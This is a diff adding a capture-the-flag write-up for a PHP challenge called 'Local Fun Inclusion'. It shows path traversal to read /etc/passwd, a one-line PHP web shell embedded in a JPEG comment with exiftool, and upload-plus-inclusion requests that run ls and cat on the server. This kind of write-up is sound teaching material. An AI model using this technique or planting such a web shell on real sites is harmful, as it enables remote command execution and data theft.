@@ -1,5 +1,64 @@
 # Web
 
+##Local Fun Inclusion
+
+## Local Fun Inclusion
+
+**Challenge**
+
+"Recently i learned how to code in PHP. There are cool tutorials for file uploads around! Imgur Memes have no chance vs. my cool image sharing website!
+
+Check it out at: http://lfi.hax1.allesctf.net:8081/"
+
+
+**Solution**
+
+**Information Gathering:**
+The website only allows uploading image files. 
+When hitting the **Submit** button without choosing an image, the URL contains a new request `site=upload.php`.
+This is a first hint for a **Local File Inclusion** vulnerability. To verify this assumption call the following URL: 
+
+> http://lfi.hax1.allesctf.net:8081/index.php?site=/../../../etc/passwd
+
+We receive the content of **/etc/passed** 
+
+Unfortunately we can't call  
+
+> http://lfi.hax1.allesctf.net:8081/index.php?site=flag.txt
+
+ to get the flag. We probably need a way to read the directories in order to find out what we're looking for.
+
+The page tells you the storage location when uploading an image. This can be used to upload our **own php** code which can be executed with the **Local File Inclusion** vulnerability.
+Unfortunately, uploading php files is forbidden by the server. We need an image file with the correct file extension and magic number. Hence, we have to fool the server, by uploading an image file containing php code.
+
+**Exploit Image**:
+To generate an empty image we can use the tool **convert**:
+
+> $ convert -size 32x32 xc:white empty.jpg
+
+Now adding your **own php code** to the image comments with **exiftool**:
+
+> $ exiftool -Comment="<?php echo shell_exec($_GET['cmd']); ?>" empty.jpg
+
+(I needed to add **$_GET** manually with vim after executing this command, as it has been removed)
+
+This simple php code `<?php echo shell_exec($_GET['cmd']); ?>` only takes a **GET-Parameter** `cmd` and executes the value as a command. Our goal is to upload this image and execute it with `[BaseURL]/index.php/site=[ImageLocation]&cmd=[arbitraryShellCommand]`. With this approach we can pass arbitrary shell commands, like `ls` to read the directories, or `cat` to read file content.
+
+So we upload this new image and getting the corresponding file location.
+Now take the URL and use **Burp** to craft our different requests:
+Activate the **Burp proxy** and do a request like `lfi.hax1.allesctf.net:8081/index.php?site=`.
+The **Burp proxy** will intercept this request and we can send it to the **Burp Repeater**.
+
+Now just append the file location the the **GET-Request** in the **Burp Repeater**.
+The following **GET**-Request will list the files of the current direcotry in the response (Keep in mind that the upload location is different for every upload):
+> GET /index.php?site=uploads/a2e4822a98337283e39f7b60acf85ec9_1.jpg&cmd=ls
+
+We can see the `flag.php` file, so we are one step away from the flag. By doing another **GET**-Request we can print the content of this file and receive the flag:
+
+> GET /index.php?site=uploads/a2e4822a98337283e39f7b60acf85ec9_1.jpg&cmd=cat%20flag.php
+
+
+
 ##StayWoke Shop
 
 **Challenge**
